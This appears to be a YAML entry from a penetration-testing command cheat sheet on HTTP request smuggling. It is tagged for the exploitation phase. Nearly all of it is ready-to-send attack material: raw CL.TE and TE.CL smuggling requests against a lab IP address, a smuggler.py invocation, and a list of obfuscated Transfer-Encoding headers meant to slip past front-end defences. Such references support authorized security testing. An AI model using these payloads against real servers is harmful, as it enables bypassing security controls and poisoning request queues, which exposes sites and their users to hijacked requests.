---
description: |
  HTTP Request Smuggling — CL.TE, TE.CL, and obfuscated Transfer-Encoding attacks to bypass front-end security controls and poison request queues.
command: |
  # CL.TE smuggling (front-end uses Content-Length, back-end uses Transfer-Encoding)
  POST / HTTP/1.1
  Host: 10.10.10.27
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED

  # TE.CL smuggling (front-end uses Transfer-Encoding, back-end uses Content-Length)
  POST / HTTP/1.1
  Host: 10.10.10.27
  Content-Length: 3
  Transfer-Encoding: chunked

  8
  SMUGGLED
  0

  # Tools
  python3 smuggler.py -u http://10.10.10.27

  # Detect with Burp Suite
  Burp > Extensions > HTTP Request Smuggler > Scan

  # Obfuscated Transfer-Encoding headers
  Transfer-Encoding: xchunked
  Transfer-Encoding : chunked
  Transfer-Encoding: chunked
  Transfer-Encoding: x
  Transfer-Encoding: chunked
  Transfer-encoding: cow
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques: []
references:
  - https://portswigger.net/web-security/request-smuggling
---
